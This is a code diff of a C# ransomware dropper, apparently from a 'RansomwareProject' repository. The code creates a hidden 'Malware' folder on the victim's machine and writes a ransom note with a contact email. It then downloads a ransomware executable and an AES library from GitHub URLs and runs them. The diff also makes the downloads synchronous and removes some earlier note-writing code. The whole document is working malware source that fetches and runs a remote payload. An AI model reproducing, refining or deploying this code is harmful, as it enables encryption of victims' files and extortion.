@@ -39,53 +39,18 @@ namespace Dropper
         }
         private void StartAction()
         {
-             this.Left = 0; //Make 0 size
-            this.Top = 0; //Make 0 size
-            this.Width = Screen.PrimaryScreen.Bounds.Width; //Make 0 size
-            this.Height = Screen.PrimaryScreen.Bounds.Height; //Make 0 size
-
-            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define path on desktop
-            string existfile = path_cache + @"\._cache_DCQPKX.exe"; //define for kill process
-            if (!File.Exists(existfile))
-            {
-                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-
-                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
-                {
-                    streamWriter.WriteLine("Ur files has been locked :-)"); //text for file
-                }
-            }
-
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt")) //Create file
-            {
-                streamWriter.WriteLine("Ur files has been locked :-)"); //Text for file
-            }
-
-            /**
-             * First determine whether the virus has already infected the operating
-             * system or not This functionality will depend on how the virus announce it
-             * has already infected a certain folder This might be done by adding a new
-             * file to the "host" directory, not decided yet Create a new Folder for the
-             * ransomware
-             */
             // Create Folder
             Directory.CreateDirectory(pathToInfect + @"\Malware");
             // Add the signature file if not exist
             var directoryInfected = File.Exists(pathToInfect + @"\Malware\README.txt");
             if (!directoryInfected)
             {
-                // create the folder and the text file in the path C:\Program
-                // Filesx86\timestamp.txt P.S : make both the file and the folder hidden
-                // so that a regular user won't notice.
                 StreamWriter writer =
                     new StreamWriter(pathToInfect + @"\Malware\README.txt");
-                writer.Write("You were encrypted by Ali & Leen, good luck...^^");
+                writer.Write("You were encrypted by Ali & Leen...you can contact  us via ali.ibrahim.2@Lit-co.net");
                 File.SetAttributes(pathToInfect + @"\Malware\README.txt",
                                    FileAttributes.Hidden);
             }
-            // if it already exists it means a previous version of the virus infected
-            // the OS then launch the virus by downloading it from a malicious site
             String link = "https://github.com/AliIbrahim996/RansomwareProject/blob/main/build/UI/Debug/Ransomeware.exe", 
             link2 = "https://github.com/AliIbrahim996/RansomwareProject/blob/main/build/UI/Debug/AES.dll";
             DownLoadFileInBackground2(link, pathToInfect + @"\Malware\Ransomeware.exe",link2,@"\Malware\AES.dll");
@@ -97,8 +62,8 @@ namespace Dropper
             }
 
             kill();
-            
-            
+            p.WaitForExit();
+            Environment.Exit(0);
         }
 
         private static void kill()
@@ -132,9 +97,9 @@ namespace Dropper
                 client.DownloadFileCompleted +=
                     new AsyncCompletedEventHandler(DownloadFileCallback2);
                 // Specify a progress notification handler here ...
-                client.DownloadFileAsync(uri,path1);
+                client.DownloadFile(uri,path1);
                 uri = new Uri(address2);
-                client.DownloadFileAsync(uri, path2);
+                client.DownloadFile(uri, path2);
             }
             catch (Exception e)
             {
